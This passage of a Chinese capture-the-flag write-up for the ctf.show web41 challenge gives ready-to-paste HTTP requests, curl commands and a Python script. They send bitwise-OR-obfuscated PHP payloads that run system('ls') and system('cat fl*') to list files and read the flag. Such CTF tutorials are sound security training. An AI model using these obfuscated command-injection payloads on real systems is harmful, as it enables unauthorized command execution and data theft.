+下面的可以直接复制粘贴，不过要注意修改你的网址
+
+```
+POST / HTTP/1.1
+Host: 176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+
+c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))
+```
+
+换 body 后 `Content-Length` 要跟着变，否则还是会读不到。可以打开 Repeater 的 **Update Content-Length** 让它自动算，或者自己数一遍字节数。
+
+这里能开：
+
+![image-20261106214422994](/assets/ctfshow-web-command-exec/image-20261106214422994.png)
+
+##### 第 4 步：发送，看响应
+
+点左上角 **Send（发送）**，右边就是 Response。
+
+![image-20261106215036260](/assets/ctfshow-web-command-exec/image-20261106215036260.png)
+
+| 响应 | 说明 |
+| :--- | :--- |
+| `flag.php` `index.php` | 成功，`ls` 执行了 |
+| 一大段 `<code><span ...><?php` | **失败**：`$_POST['c']` 没收到，回第 2 步检查三处 |
+| 单个字符 `s` | 说明发的是最短测试 payload，正常 |
+| `Call to undefined function xxx` | 函数名拼错了 |
+
+##### 第5步：换成读 flag 的payload
+
+参数c换成，读flag（相当于 `system("cat fl*")`）：
+
+```
+c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%03'|'%60').('%01'|'%60').('%14'|'%60').(' '|' ').('%06'|'%60').('%0c'|'%60').('%0a'|' '))
+```
+
+下面的可以直接复制粘贴，不过你的网址记得换
+
+```
+POST / HTTP/1.1
+Host: 176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Content-Length: 180
+
+c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%03'|'%60').('%01'|'%60').('%14'|'%60').(' '|' ').('%06'|'%60').('%0c'|'%60').('%0a'|' '))
+```
+
+![image-20261106215456406](/assets/ctfshow-web-command-exec/image-20261106215456406.png)
+
+#### 法2：用 curl（Git Bash，一条命令）
+
+先测最短的：
+
+```bash
+curl -sk -X POST "https://176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show/" \
+  --data "c=('%13'|'%60')"
+```
+
+![image-20261106220832708](/assets/ctfshow-web-command-exec/image-20261106220832708.png)
+
+读目录：
+
+```bash
+curl -sk -X POST "https://176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show/" \
+  --data "c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))"
+```
+
+![image-20261106220927526](/assets/ctfshow-web-command-exec/image-20261106220927526.png)
+
+读 flag：
+
+```bash
+curl -sk -X POST "https://176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show/" \
+  --data "c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%03'|'%60').('%01'|'%60').('%14'|'%60').(' '|' ').('%06'|'%60').('%0c'|'%60').('%0a'|' '))"
+```
+
+![image-20261106221006032](/assets/ctfshow-web-command-exec/image-20261106221006032.png)
+
+- `-X POST`：强制用 POST
+- `--data`：把后面整串当 body 发出去，**不会**再编码，`%13` 原样保留（正好是这题要的）
+- `--data` 会自动带上 `Content-Type: application/x-www-form-urlencoded` 并算好 `Content-Length`，不用自己写
+- `-k`：跳过 HTTPS 证书校验（本机 curl 有时会因证书吊销检查报错）
+- `-s`：安静模式，只输出响应
+
+#### 法3：用 Python（requests）
+
+```python
+import requests
+
+url = "https://75f6f1f5-65ee-4706-89c6-8327d0762366.challenge.ctf.show/"
+payload = "c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))"
+
+r = requests.post(
+    url,
+    data=payload,
+    headers={"Content-Type": "application/x-www-form-urlencoded"},
+    verify=False,
+)
+print(r.text)
+```
+
+**注意**：`data` 要直接给**字符串**。如果写成 `data={"c": payload}`，requests 会对值再做一次 URL 编码，`%13` 变成 `%2513`，payload 就废了。
+
+#### Q3：为什么不能直接用浏览器地址栏？
+
+> 地址栏只能发 **GET**，参数会拼在 URL 的 `?` 后面；而 web41 读的是 `$_POST['c']`，GET 传不进去。想在浏览器里发 POST，只能在页面里写一个 `<form method="post">` 来提交——比用 Burp/HackBar 麻烦，不推荐。
